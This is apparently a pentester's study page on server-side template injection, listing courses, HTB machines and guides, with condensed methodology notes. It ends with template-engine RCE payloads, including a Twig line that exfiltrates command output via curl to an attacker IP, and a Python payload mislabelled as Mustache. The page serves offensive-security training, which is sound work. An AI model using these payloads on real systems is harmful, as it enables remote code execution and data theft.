![image](https://github.com/user-attachments/assets/96c1a0f1-af0c-4757-80a9-61e23a072119)

# Template Injection

## Training Resources
---

**Courses**

*Free*
- [PortSwigger Academy - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)

*Paid*
- [HTB - Server-Side Attacks](https://academy.hackthebox.com/course/preview/server-side-attacks)
- [THM - Server-Side Template Injection](https://tryhackme.com/r/hacktivities/search?page=1&kind=all&searchText=server+side+temp)
- [THM - SSTI](https://tryhackme.com/r/room/learnssti)

#

### Hack The Box Machines
*These machines are tagged as containing Template Injection by HTB, the difficulty refers to the box as a whole and not necessarily the Template Injection element.*

| Machine Name | Difficulty | Completed |
| -- | -- | -- | -- | -- |
| Smart | Easy | |
| RedPanda | Easy | |
| Perfection | Easy | |
| Nunchucks | Easy | |
| Late | Easy | |
| Doctor | Easy | |
| Crushed | Easy | |
| Art | Easy | |
| Bolt | Medium | |
| Gobox | Medium | |
| GoodGames | Medium | |
| Flustered | Medium | |
| Epsilon | Medium | |
| Sandworm | Medium | |
| Talkative | Hard | |
| Hancliffe | Hard | |
| OverGraph | Hard | |
| Spider | Hard | |
| Oz | Hard | |


### Other Resources
---
**PT Guides**
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [Hacker Recipes - Server-Sie Template Injection](https://www.thehacker.recipes/web/inputs/ssti#%F0%9F%9B%A0%EF%B8%8F-ssti-server-side-template-injection)
#
**Methodologies**
- [OWASP Methodology - Server Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
#
**Wordlists**
- [PATT SSTI Wordlists](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
#

## Condensed Notes
This is a condensed version of the notes I used during OSWA and are by no means complete. Make your own notes and methodology, building off these basic steps. 

- Identify if the application is using templates anywhere on the target.
- If you believe it is, figure out the injection point and where you can view the injection response. Try injecting payloads into the injection point to determine the template engine in use. An example of how this can be done can be seen in the diagram below:
![image](https://github.com/user-attachments/assets/360aee24-7675-405a-bcc8-b96003437561)
- Where you cannot identify where to view the injection, consider blind injection, can you inject into emails for example. Use out of band attacks here like connecting back to an attacker controlled web server.
- Other ways to identify the templating engine is to look for patterns in:
  - Paths - Certain template engines use common paths, for example junja2 and Flask often have a /templates/ directory.
  - File Extensions - Are there files present with extensions that give away the engine, for example .twig, .mistache etc.
  - Headers - Are there clues to the engine in the headers returned from the server.
- Once injection and the engine have been identified, try to get RCE. This might require reading the engine documentation. Some RCE examples can be seen below for various templating engines:
```bash
# Twig
{% set exfil = output| url_encode %}
{{[0]|reduce('system','curl http://<ip>/?exfil=' ~ exfil)}}

# Freemarker
${"freemarker.template.utility.Execute"?new()("id")}

# Mustache
${__import__('os').popen('whoami').read()}
```
